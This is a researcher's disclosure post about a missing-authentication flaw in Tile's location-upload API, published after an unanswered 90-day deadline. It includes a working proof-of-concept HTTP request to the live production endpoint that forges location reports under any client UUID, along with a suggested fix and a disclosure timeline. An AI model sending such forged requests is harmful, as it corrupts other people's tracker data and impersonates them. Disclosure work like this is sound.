---
title: 'Tile - Unauthorized Location Reports with Impersonation'
publishedAt: '2024-07-05'
description: "Tile, a company selling Bluetooth-based location trackers, has a vulnerability that allows an attacker to send forged location reports while pretending to be another user. I uncovered this vulnerability during my master's thesis, in which I analyzed the security and privacy of the Tile ecosystem."
tags:
  - security
---

In my master's thesis, I analyzed the security and privacy of large portions of Tile's ecosystem.
During this, I discovered several security vulnerabilities affecting various components and features.
I reported these vulnerabilities to Tile, following [Google Project Zero's responsible disclosure policy](https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html).
However, as the 90-day deadline is over and Tile has failed to respond or patch the issues, I'm publishing my findings in hopes of raising awareness.
This post describes one vulnerability that allows an attacker to send forged location reports while pretending to be another user.

# Vulnerability

The API endpoint to upload location reports doesn't properly check the user's session, allowing an unauthenticated attacker to upload location reports for the Tile trackers of other users while pretending to be someone else.

Using this vulnerability, an attacker could effectively make Tile's tracking network (called _Community Find_) unusable for all users on the platform.

It is unclear to what extent the impersonation affects users.
As the attacker is able to specify the client UUID of any user's client, the effect depends on how Tile further processes the client UUID.

# Proof-of-Concept

To upload a fake location report, the attacker must send the request below.
The attacker must either record or know a Bluetooth Low-Energy advertisement of the targeted Tile tracker or create a valid advertisement from the tracker's Tile UUID.
They must specify the advertisement value in the field `payload_service_data` in the request's body.

```http
POST https://locations-prod.tile-api.com/api/v1/clients/:clientUUID/batch_location_updates HTTP/1.1
tile_app_id: android-tile-production
tile_app_version: 2.115.0.5050
tile_request_timestamp: 1702998513342
Content-Type: application/json
Accept: */*
Host: locations-prod.tile-api.com
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 978

{
	"updates": [
		{
			"location": {
				"altitude": 182.5,
				"course": 0.0,
				"course_accuracy": 0.0,
				"horizontal_accuracy": 20.0,
				"latitude": 13.0,
				"longitude": 37.0,
				"speed": 0.0,
				"speed_accuracy": 0.0,
				"timestamp": 1702998513342,
				"vertical_accuracy": 1.1406626
			},
			"record_id": "1",
			"tiles": [
				{
					"advertised_service_data": {
						"mac_address": "[...]",
						"payload_service_data": "[...]",
						"payload_tx_power_level": "0x-80000000",
						"rssi": -53.0
					},
					"discovery_timestamp": 1702998513342,
					"record_id": "1"
				}
			]
		}
	]
}
```

The request demonstrates that it is possible to specify a valid client UUID when sending location reports without any authentication.
Thus, it is possible to impersonate any client.
Note that the request doesn't contain a session cookie.
However, the server still accepts the request.
Moreover, the attacker can specify any client UUID, and the server simply accepts it.
Since the client UUID is linked to a specific account, the attacker can impersonate any user's client.

The following request and response show that the location report sent in the request above was inserted into the device's location history.
It's the location history of the device to which the advertisement referenced in the location report belongs.

```http
GET https://production.tile-api.com/api/v1/tiles/location/history/:tileUUID?start_ts=0 HTTP/1.1
Cookie: session=[...]
[...]: [...]

HTTP/1.1 200 OK
[...]: [...]

{
    "version": 1,
    "revision": 1,
    "timestamp": "2024-03-12T14:47:17.935Z",
    "timestamp_ms": 1710254837935,
    "result_code": 0,
    "result": {
        "complete_history": "Y",
        "location_updates": [
            {
                "tile_uuid": ":tileUUID",
                "location_timestamp": 1710254284721,
                "raw_precision": 20.0,
                "latitude": 13.0,
                "longitude": 37.0,
                "precision": 20.0
            },
            [...]
		]
    }
}
```

# Fix

It is recommended to validate the user's session and reject the request if the session cookie is missing, invalid, or doesn't belong to the specified client UUID.
If unauthenticated location reports should be possible, it is recommended to remove the client UUID from the request URL.
However, these would only fix the impersonation issue.
Fixing the issue of fake location reports requires changes to the entire _Community Find_ network.

# Timeline

- 2024-03-13: Contacted Life 360's security contact through responsibledisclosure@life360.com
- 2024-05-21: Contacted Tile's support asking for a status update
